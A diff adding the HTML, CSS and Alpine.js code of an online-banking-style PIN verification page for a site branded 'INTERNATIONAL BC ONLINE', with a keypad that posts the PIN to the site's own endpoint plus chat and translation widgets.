@@ -1,0 +1,833 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>INTERNATIONAL BC ONLINE - PIN Verification</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="csrf-token" content="JVJHIkK2HapcnxrkNIyJ9ywXYoaQlt7Mzq6zlADO">
+    <meta name="robots" content="index, follow">
+    <meta name="apple-mobile-web-app-title" content="INTERNATIONAL BC ONLINE">
+    <meta name="application-name" content="INTERNATIONAL BC ONLINE">
+    <meta name="description" content="Swift and Secure Money Transfer to any UK bank account will become a breeze with INTERNATIONAL BC ONLINE.">
+    <link rel="shortcut icon" href="https://intl-bc-online.com/storage/app/public/photos/zhgA0hpLUhumUA7Tq7UYDacVgEw4SuCXOnybFlPc.png">
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: {
+                            50: '#E0E0E0',
+                            100: '#E0E0E0',
+                            200: '#E0E0E0',
+                            300: '#E0E0E0',
+                            400: '#E0E0E0',
+                            500: '#0147E1',
+                            600: '#0147E1',
+                            700: '#0147E1',
+                            800: '#0147E1',
+                            900: '#0147E1',
+                        },
+                        secondary: {
+                            50: '#FFECB3',
+                            100: '#FFECB3',
+                            200: '#FFECB3',
+                            300: '#FFECB3',
+                            400: '#FFECB3',
+                            500: '#FFC107',
+                            600: '#FFC107',
+                            700: '#CC9900',
+                            800: '#CC9900',
+                            900: '#CC9900',
+                        }
+                    },
+                    fontFamily: {
+                        'sans': ['Lato', 'sans-serif'],
+                    },
+                    animation: {
+                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                        'float': 'float 6s ease-in-out infinite',
+                    },
+                    keyframes: {
+                        float: {
+                          '0%, 100%': { transform: 'translateY(0)' },
+                          '50%': { transform: 'translateY(-10px)' },
+                        }
+                    },
+                }
+            }
+        }
+    </script>
+    
+    <!-- Alpine.js -->
+    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
+    
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <script src="https://cdn.jsdelivr.net/npm/lucide@latest/dist/umd/lucide.min.js"></script>
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700;900&display=swap" rel="stylesheet">
+    
+    <!-- CSS Variables -->
+    <script>
+        // Set CSS theme variables
+        document.documentElement.style.setProperty('--primary-color', '#0147E1');
+        document.documentElement.style.setProperty('--primary-color-dark', '#0147E1');
+        document.documentElement.style.setProperty('--primary-color-light', '#E0E0E0');
+        document.documentElement.style.setProperty('--secondary-color', '#FFC107');
+        document.documentElement.style.setProperty('--secondary-color-dark', '#CC9900');
+        document.documentElement.style.setProperty('--secondary-color-light', '#FFECB3');
+        document.documentElement.style.setProperty('--text-color', '#828282');
+        document.documentElement.style.setProperty('--bg-color', '#f9fafb');
+        document.documentElement.style.setProperty('--card-bg-color', '#F4F5F7');
+    </script>
+    
+        
+    <!-- Animated Loading Screen -->
+    <style>
+        .page-loading {
+            position: fixed;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            transition: all .4s .2s ease-in-out;
+            background-color: #ffffff;
+            visibility: hidden;
+            z-index: 9999;
+        }
+        .page-loading.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        .page-loading-inner {
+            position: absolute;
+            top: 50%;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            transform: translateY(-50%);
+            transition: opacity .2s ease-in-out;
+            opacity: 0;
+        }
+        .page-loading.active>.page-loading-inner {
+            opacity: 1;
+        }
+        
+        .loader {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 30px;
+        }
+        
+        .loader-circle {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 4px solid transparent;
+            border-top-color: var(--primary-color);
+            animation: spin 2s linear infinite;
+        }
+        
+        .loader-circle:nth-child(2) {
+            border-top-color: transparent;
+            border-right-color: var(--primary-color);
+            animation: spin 3s linear infinite;
+        }
+        
+        .loader-circle:nth-child(3) {
+            width: 80%;
+            height: 80%;
+            top: 10%;
+            left: 10%;
+            border-top-color: transparent;
+            border-left-color: var(--primary-color-light);
+            animation: spin 1.5s linear infinite reverse;
+        }
+        
+        .loader-logo {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 40%;
+            height: 40%;
+            background-color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .loader-progress {
+            position: relative;
+            width: 200px;
+            height: 4px;
+            background-color: rgba(14, 165, 233, 0.2);
+            border-radius: 2px;
+            margin: 10px auto;
+            overflow: hidden;
+        }
+        
+        .loader-progress-bar {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 0%;
+            background-color: var(--primary-color);
+            border-radius: 2px;
+            animation: progress 2s ease-in-out infinite;
+        }
+        
+        @keyframes  spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes  progress {
+            0% { width: 0%; }
+            50% { width: 100%; }
+            100% { width: 0%; left: 100%; }
+        }
+        
+        /* Numeric keypad styles */
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            width: 100%;
+            max-width: 300px;
+            margin: 0 auto;
+        }
+        
+        .key {
+            aspect-ratio: 1/1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            font-size: 1.5rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            user-select: none;
+        }
+        
+        .key:active {
+            transform: scale(0.95);
+        }
+        
+        .pin-display {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        
+        .pin-digit {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            background-color: #e5e7eb;
+            transition: all 0.2s;
+        }
+        
+        .pin-digit.active {
+            background-color: var(--primary-color);
+        }
+        
+        /* 3D button effect */
+        .btn-3d {
+            position: relative;
+            transition: all 0.2s;
+            transform-style: preserve-3d;
+            transform: perspective(800px) translateZ(0);
+        }
+        
+        .btn-3d:hover {
+            transform: perspective(800px) translateZ(10px);
+        }
+        
+        .btn-3d:active {
+            transform: perspective(800px) translateZ(2px);
+        }
+        
+        .btn-3d::before {
+            content: '';
+            position: absolute;
+            bottom: -4px;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background-color: rgba(0, 0, 0, 0.1);
+            border-bottom-left-radius: inherit;
+            border-bottom-right-radius: inherit;
+            transition: all 0.2s;
+        }
+        
+        .btn-3d:active::before {
+            height: 2px;
+            bottom: -2px;
+        }
+    </style>
+    <!-- Web Application Manifest -->
+<link rel="manifest" href="https://intl-bc-online.com/manifest.json">
+<!-- Chrome for Android theme color -->
+<meta name="theme-color" content="#1a365d">
+
+<!-- Add to homescreen for Chrome on Android -->
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="application-name" content="RSB Online Banking">
+<link rel="icon" sizes="512x512" href="/images/icons/icon-512x512.png">
+
+<!-- Add to homescreen for Safari on iOS -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+<meta name="apple-mobile-web-app-title" content="RSB Online Banking">
+<link rel="apple-touch-icon" href="/images/icons/icon-512x512.png">
+
+
+<link href="/images/icons/splash-640x1136.png" media="(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image" />
+<link href="/images/icons/splash-750x1334.png" media="(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image" />
+<link href="/images/icons/splash-1242x2208.png" media="(device-width: 621px) and (device-height: 1104px) and (-webkit-device-pixel-ratio: 3)" rel="apple-touch-startup-image" />
+<link href="/images/icons/splash-1125x2436.png" media="(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3)" rel="apple-touch-startup-image" />
+<link href="/images/icons/splash-828x1792.png" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image" />
+<link href="/images/icons/splash-1242x2688.png" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 3)" rel="apple-touch-startup-image" />
+<link href="/images/icons/splash-1536x2048.png" media="(device-width: 768px) and (device-height: 1024px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image" />
+<link href="/images/icons/splash-1668x2224.png" media="(device-width: 834px) and (device-height: 1112px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image" />
+<link href="/images/icons/splash-1668x2388.png" media="(device-width: 834px) and (device-height: 1194px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image" />
+<link href="/images/icons/splash-2048x2732.png" media="(device-width: 1024px) and (device-height: 1366px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image" />
+
+<!-- Tile for Win8 -->
+<meta name="msapplication-TileColor" content="#ffffff">
+<meta name="msapplication-TileImage" content="/images/icons/icon-512x512.png">
+
+<script type="text/javascript">
+    // Initialize the service worker
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('/serviceworker.js', {
+            scope: '.'
+        }).then(function (registration) {
+            // Registration was successful
+            console.log('Laravel PWA: ServiceWorker registration successful with scope: ', registration.scope);
+        }, function (err) {
+            // registration failed :(
+            console.log('Laravel PWA: ServiceWorker registration failed: ', err);
+        });
+    }
+</script></head>
+
+<body class="font-sans bg-gray-50 text-gray-900">
+    <!-- Page Loader -->
+    <div class="page-loading active">
+        <div class="page-loading-inner">
+            <div class="loader">
+                <div class="loader-circle"></div>
+                <div class="loader-circle"></div>
+                <div class="loader-circle"></div>
+                <div class="loader-logo">
+                    <img src="https://intl-bc-online.com/storage/app/public/photos/13tIhKkSILyryKxw7XKFROsurhsPYAhT0XW5pWVN.jpg" alt="Logo" class="w-3/4 h-auto">
+                </div>
+            </div>
+            <div class="loader-progress">
+                <div class="loader-progress-bar"></div>
+            </div>
+            <p class="mt-3 text-sm text-gray-500">
+                Loading secure environment...
+            </p>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="min-h-screen flex flex-col">
+        <main class="flex-grow flex items-center justify-center px-4 py-12">
+            <div class="w-full max-w-md">
+                
+<div x-data="{
+    pin: '',
+    maxLength: 4,
+    isProcessing: false,
+    errorMessage: '',
+    successMessage: '',
+    isMobile: window.innerWidth < 768,
+    showKeypad: true,
+
+    init() {
+        window.addEventListener('resize', () => {
+            this.isMobile = window.innerWidth < 768;
+        });
+
+        // Auto-submit when complete (for keypad entry)
+        this.$watch('pin', value => {
+            if (value.length === this.maxLength && this.isMobile) {
+                setTimeout(() => this.submitPin(), 300);
+            }
+        });
+    },
+
+    addDigit(digit) {
+        if (this.pin.length < this.maxLength) {
+            this.pin += digit;
+            // Add haptic feedback for mobile
+            if (this.isMobile && window.navigator.vibrate) {
+                window.navigator.vibrate(50);
+            }
+        }
+    },
+
+    removeDigit() {
+        this.pin = this.pin.slice(0, -1);
+    },
+
+    clearPin() {
+        this.pin = '';
+    },
+
+    async submitPin() {
+        if (this.pin.length < this.maxLength) {
+            this.errorMessage = 'Please enter all 4 digits';
+            setTimeout(() => this.errorMessage = '', 3000);
+            return;
+        }
+
+        this.isProcessing = true;
+
+        try {
+            const response = await fetch('https://intl-bc-online.com/dashboard/pinstatus', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-CSRF-TOKEN': document.querySelector('meta[name=csrf-token]').content
+                },
+                body: JSON.stringify({ pin: this.pin })
+            });
+
+            const result = await response.json();
+
+            if (result.success) {
+                this.successMessage = result.message || 'PIN verified successfully!';
+
+                // Success animation
+                if (document.getElementById('success-checkmark')) {
+                    document.getElementById('success-checkmark').classList.remove('hidden');
+                    document.getElementById('success-checkmark').classList.add('animate-success');
+                }
+
+                setTimeout(() => window.location.href = result.redirect || 'https://intl-bc-online.com/dashboard', 1500);
+            } else {
+                this.errorMessage = result.message || 'Invalid PIN. Please try again.';
+
+                // Error animation with enhanced visual feedback
+                if (this.isMobile) {
+                    const pinDisplay = document.querySelector('.pin-display');
+                    if (pinDisplay) {
+                        pinDisplay.classList.add('animate-shake');
+                        setTimeout(() => pinDisplay.classList.remove('animate-shake'), 500);
+                    }
+                } else {
+                    const pinInput = document.getElementById('desktop-pin');
+                    if (pinInput) {
+                        pinInput.classList.add('border-red-500', 'animate-shake');
+                        setTimeout(() => pinInput.classList.remove('border-red-500', 'animate-shake'), 500);
+                    }
+                }
+
+                this.pin = '';
+                setTimeout(() => this.errorMessage = '', 3000);
+            }
+        } catch (error) {
+            this.errorMessage = 'An error occurred. Please try again.';
+            setTimeout(() => this.errorMessage = '', 3000);
+        } finally {
+            this.isProcessing = false;
+        }
+    }
+}" class="flex items-center justify-center min-h-screen w-full bg-gradient-to-br from-gray-50 to-gray-100 p-4">
+
+    <!-- Card Container with Enhanced Shadow and Animation -->
+    <div class="w-full max-w-md bg-white rounded-3xl shadow-2xl overflow-hidden transform transition-all duration-300 hover:shadow-3xl">
+
+        <!-- Header with Improved Gradient -->
+        <div class="relative">
+            <!-- Enhanced Background Pattern -->
+            <div class="absolute inset-0 bg-gradient-to-br from-primary-500 via-primary-600 to-primary-700 opacity-95"></div>
+
+            <!-- Animated Decorative Elements -->
+            <div class="absolute top-0 left-0 w-full h-full overflow-hidden">
+                <div class="absolute -top-20 -left-20 w-64 h-64 rounded-full bg-white opacity-10 animate-pulse-slow"></div>
+                <div class="absolute top-10 right-10 w-20 h-20 rounded-full bg-white opacity-10 animate-pulse-slow delay-100"></div>
+                <div class="absolute bottom-0 right-0 w-40 h-40 rounded-full bg-white opacity-10 animate-pulse-slow delay-200"></div>
+                <div class="absolute bottom-10 left-10 w-16 h-16 rounded-full bg-white opacity-10 animate-pulse-slow delay-300"></div>
+            </div>
+
+            <!-- Enhanced Content -->
+            <div class="relative py-10 px-6 flex flex-col items-center">
+                <div class="w-20 h-20 bg-white/20 backdrop-blur-md rounded-full flex items-center justify-center mb-6 shadow-lg transform transition-transform duration-300 hover:scale-110">
+                    <i data-lucide="fingerprint" class="h-10 w-10 text-white"></i>
+                </div>
+
+                <h1 class="text-2xl font-bold text-white text-center mb-1">Verify Your Identity</h1>
+                <p class="text-white/90 text-center max-w-xs">
+                    Please enter your secure 4-digit PIN to continue
+                </p>
+            </div>
+        </div>
+
+        <!-- Enhanced User Info Area -->
+        <div class="flex flex-col items-center pt-8 pb-4">
+            <!-- Improved User Avatar -->
+            <div class="relative transform transition-transform duration-300 hover:scale-105">
+                <div class="w-24 h-24 rounded-full overflow-hidden border-4 border-white shadow-lg">
+                    <img
+                        src="https://intl-bc-online.com/storage/app/public/photos/nMZk6169ccaf0f-60b5-46d1-8e77-df260d16e1be.jpeg1777502214"
+                        alt="Andrew"
+                        onerror="this.src='https://ui-avatars.com/api/?name=Andrew&color=7F9CF5&background=EBF4FF';"
+                        class="w-full h-full object-cover transform transition-transform duration-300 hover:scale-110">
+                </div>
+
+                <!-- Enhanced Security Badge -->
+                <div class="absolute -right-2 -bottom-1 bg-primary-100 text-primary-700 p-1.5 rounded-full border-2 border-white shadow-md transform transition-transform duration-300 hover:scale-110">
+                    <i data-lucide="shield" class="h-5 w-5"></i>
+                </div>
+            </div>
+
+            <!-- Enhanced User Name -->
+            <h2 class="mt-4 text-xl font-bold text-gray-800">
+                Andrew  Levin
+            </h2>
+
+            <!-- Enhanced User Status -->
+                            <!-- Enhanced Success Animation -->
+                <div id="success-checkmark" class="hidden absolute z-10 flex items-center justify-center">
+                    <div class="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center text-green-500 shadow-lg">
+                        <i data-lucide="check" class="h-10 w-10"></i>
+                    </div>
+                </div>
+
+                <!-- Enhanced Error/Success Messages -->
+                <div
+                    x-show="errorMessage"
+                    x-transition:enter="transition ease-out duration-300"
+                    x-transition:enter-start="opacity-0 transform -translate-y-2"
+                    x-transition:enter-end="opacity-100 transform translate-y-0"
+                    x-transition:leave="transition ease-in duration-200"
+                    x-transition:leave-start="opacity-100 transform translate-y-0"
+                    x-transition:leave-end="opacity-0 transform -translate-y-2"
+                    class="mt-4 text-center text-red-600 text-sm font-medium max-w-xs">
+                    <span x-text="errorMessage"></span>
+                </div>
+
+                <div
+                    x-show="successMessage"
+                    x-transition:enter="transition ease-out duration-300"
+                    x-transition:enter-start="opacity-0 transform -translate-y-2"
+                    x-transition:enter-end="opacity-100 transform translate-y-0"
+                    x-transition:leave="transition ease-in duration-200"
+                    x-transition:leave-start="opacity-100 transform translate-y-0"
+                    x-transition:leave-end="opacity-0 transform -translate-y-2"
+                    class="mt-4 text-center text-green-600 text-sm font-medium max-w-xs">
+                    <span x-text="successMessage"></span>
+                </div>
+
+                <!-- Enhanced Mobile PIN Entry -->
+                <div class="px-6 pb-6 w-full md:hidden">
+
+                    <!-- Enhanced PIN Display Dots -->
+                    <div class="pin-display flex justify-center space-x-4 mb-6">
+                        <template x-for="(digit, index) in Array.from({length: maxLength})">
+                            <div
+                                class="w-5 h-5 rounded-full transition-all duration-300 transform hover:scale-110"
+                                :class="index < pin.length ? 'bg-primary-600 scale-110 shadow-md' : 'bg-gray-200'">
+                            </div>
+                        </template>
+                    </div>
+
+                    <!-- Enhanced Instructional Text -->
+                    <p class="text-xs text-gray-500 text-center mb-6">
+                        Enter the 4-digit PIN you created during registration
+                    </p>
+
+                    <!-- Enhanced Mobile Numeric Keypad -->
+                    <div class="keypad grid grid-cols-3 gap-4">
+                        <!-- Numbers 1-9 -->
+                        <template x-for="n in 9">
+                            <button
+                                type="button"
+                                @click="addDigit(n)"
+                                :disabled="isProcessing || pin.length >= maxLength"
+                                class="aspect-square rounded-xl bg-white border border-gray-100 shadow-sm hover:shadow-md hover:border-primary-100 hover:bg-primary-50 transition-all duration-300 text-xl font-semibold text-gray-700 flex items-center justify-center transform hover:-translate-y-1"
+                                :class="{'opacity-50 cursor-not-allowed': isProcessing || pin.length >= maxLength}">
+                                <span x-text="n"></span>
+                            </button>
+                        </template>
+
+                        <!-- Enhanced Clear button -->
+                        <button
+                            type="button"
+                            @click="clearPin()"
+                            :disabled="isProcessing || pin.length === 0"
+                            class="aspect-square rounded-xl bg-white border border-yellow-100 shadow-sm hover:shadow-md hover:bg-yellow-50 transition-all duration-300 text-xl text-yellow-700 flex items-center justify-center transform hover:-translate-y-1"
+                            :class="{'opacity-50 cursor-not-allowed': isProcessing || pin.length === 0}">
+                            <i data-lucide="rotate-ccw" class="h-6 w-6"></i>
+                        </button>
+
+                        <!-- Enhanced Number 0 -->
+                        <button
+                            type="button"
+                            @click="addDigit(0)"
+                            :disabled="isProcessing || pin.length >= maxLength"
+                            class="aspect-square rounded-xl bg-white border border-gray-100 shadow-sm hover:shadow-md hover:border-primary-100 hover:bg-primary-50 transition-all duration-300 text-xl font-semibold text-gray-700 flex items-center justify-center transform hover:-translate-y-1"
+                            :class="{'opacity-50 cursor-not-allowed': isProcessing || pin.length >= maxLength}">
+                            0
+                        </button>
+
+                        <!-- Enhanced Backspace button -->
+                        <button
+                            type="button"
+                            @click="removeDigit()"
+                            :disabled="isProcessing || pin.length === 0"
+                            class="aspect-square rounded-xl bg-white border border-gray-100 shadow-sm hover:shadow-md hover:border-primary-100 hover:bg-primary-50 transition-all duration-300 text-xl text-gray-700 flex items-center justify-center transform hover:-translate-y-1"
+                            :class="{'opacity-50 cursor-not-allowed': isProcessing || pin.length === 0}">
+                            <i data-lucide="delete" class="h-6 w-6"></i>
+                        </button>
+                    </div>
+
+                    <!-- Enhanced Manual Submit Button for Mobile -->
+                    <button
+                        type="button"
+                        @click="submitPin()"
+                        :disabled="isProcessing || pin.length !== maxLength"
+                        class="w-full mt-8 py-3 bg-primary-600 hover:bg-primary-700 text-white rounded-xl flex items-center justify-center transition-all duration-300 shadow-md hover:shadow-lg transform hover:-translate-y-1"
+                        :class="{'opacity-50 cursor-not-allowed': isProcessing || pin.length !== maxLength}">
+                        <template x-if="!isProcessing">
+                            <div class="flex items-center">
+                                <i data-lucide="log-in" class="h-5 w-5 mr-2"></i>
+                                Verify PIN
+                            </div>
+                        </template>
+                        <template x-if="isProcessing">
+                            <div class="flex items-center">
+                                <svg class="animate-spin h-5 w-5 mr-2 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                                </svg>
+                                Verifying...
+                            </div>
+                        </template>
+                    </button>
+                </div>
+
+                <!-- Enhanced Desktop PIN Entry -->
+                <div class="px-6 pb-6 w-full hidden md:block">
+                    <div class="mb-6">
+                        <label for="desktop-pin" class="block text-sm font-medium text-gray-700 mb-2">Enter your 4-digit verification PIN</label>
+                        <input
+                            id="desktop-pin"
+                            type="password"
+                            inputmode="numeric"
+                            maxlength="4"
+                            pattern="[0-9]*"
+                            x-model="pin"
+                            :disabled="isProcessing"
+                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500 text-center text-xl tracking-widest transition-all duration-300 hover:border-primary-300"
+                            placeholder="••••">
+                    </div>
+
+                    <!-- Enhanced Submit Button for Desktop -->
+                    <button
+                        type="button"
+                        @click="submitPin()"
+                        :disabled="isProcessing || pin.length !== maxLength"
+                        class="w-full py-3 bg-primary-600 hover:bg-primary-700 text-white rounded-lg flex items-center justify-center transition-all duration-300 transform hover:-translate-y-1 shadow-md hover:shadow-lg"
+                        :class="{'opacity-50 cursor-not-allowed': isProcessing || pin.length !== maxLength}">
+                        <template x-if="!isProcessing">
+                            <div class="flex items-center">
+                                <i data-lucide="shield-check" class="h-5 w-5 mr-2"></i>
+                                Verify PIN
+                            </div>
+                        </template>
+                        <template x-if="isProcessing">
+                            <div class="flex items-center">
+                                <svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                                </svg>
+                                Processing...
+                            </div>
+                        </template>
+                    </button>
+                </div>
+                    </div>
+
+        <!-- Enhanced Footer Security Info -->
+        <div class="px-6 pb-8 pt-4">
+            <div class="flex items-center justify-center p-3 bg-gray-50 rounded-xl transition-all duration-300 hover:bg-gray-100">
+                <i data-lucide="lock" class="h-4 w-4 text-primary-500 mr-2"></i>
+                <p class="text-xs text-gray-600">
+                    Your security is our priority. PIN verification protects your account from unauthorized access.
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+            </div>
+        </main>
+        
+        <footer class="py-4 bg-white border-t border-gray-200">
+            <div class="container mx-auto px-4 text-center">
+                <p class="text-sm text-gray-600">&copy; 2026 INTERNATIONAL BC ONLINE. All rights reserved.</p>
+                <div class="mt-2 flex justify-center space-x-4">
+                    <a href="#" class="text-xs text-gray-500 hover:text-primary-600">Privacy Policy</a>
+                    <a href="#" class="text-xs text-gray-500 hover:text-primary-600">Terms of Service</a>
+                    <a href="#" class="text-xs text-gray-500 hover:text-primary-600">Contact Support</a>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Initialize Lucide Icons -->
+    <script>
+        lucide.createIcons();
+    </script>
+    
+    <!-- Enhanced Page Loading Animation -->
+    <script>
+        window.onload = function() {
+            const preloader = document.querySelector('.page-loading');
+            
+            // Add a slight delay to make loading animation more noticeable
+            setTimeout(function() {
+                preloader.classList.remove('active');
+                setTimeout(function() {
+                    preloader.remove();
+                }, 500);
+            }, 800);
+        };
+    </script>
+    
+    
+    <style>
+    /* Enhanced Animation classes */
+    @keyframes  shake {
+        0%, 100% { transform: translateX(0); }
+        25% { transform: translateX(-5px); }
+        50% { transform: translateX(5px); }
+        75% { transform: translateX(-5px); }
+    }
+
+    @keyframes  success-scale {
+        0% { transform: scale(1); }
+        50% { transform: scale(1.2); }
+        100% { transform: scale(1); }
+    }
+
+    @keyframes  pulse-slow {
+        0%, 100% { opacity: 0.1; }
+        50% { opacity: 0.2; }
+    }
+
+    .animate-shake {
+        animation: shake 0.5s ease-in-out;
+    }
+
+    .animate-success {
+        animation: success-scale 0.6s ease-in-out;
+    }
+
+    .animate-pulse-slow {
+        animation: pulse-slow 3s infinite;
+    }
+
+    .delay-100 {
+        animation-delay: 100ms;
+    }
+
+    .delay-200 {
+        animation-delay: 200ms;
+    }
+
+    .delay-300 {
+        animation-delay: 300ms;
+    }
+
+    .shadow-3xl {
+        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+    }
+</style>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // Focus the desktop PIN input field if visible
+        const pinInput = document.getElementById('desktop-pin');
+        if (pinInput && window.innerWidth >= 768) {
+            pinInput.focus();
+
+            // Only allow numbers in the PIN input
+            pinInput.addEventListener('keypress', function(e) {
+                const charCode = (e.which) ? e.which : e.keyCode;
+                if (charCode > 31 && (charCode < 48 || charCode > 57)) {
+                    e.preventDefault();
+                    return false;
+                }
+                return true;
+            });
+        }
+    });
+</script>
+       <!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = '3dc64875767baad93d16720dd4d0fa897ff02122';
+window.smartsupp||(function(d) {
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+  c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+<noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+         <div class="gtranslate_wrapper"></div>
+<script>
+    window.gtranslateSettings = {
+        default_language: "en",
+        alt_flags:{"en":"usa"},
+        wrapper_selector: ".gtranslate_wrapper",
+        flag_style: "3d",
+    };
+</script>
+<script src="https://cdn.gtranslate.net/widgets/latest/float.js" defer></script>
+</body>
+</html>
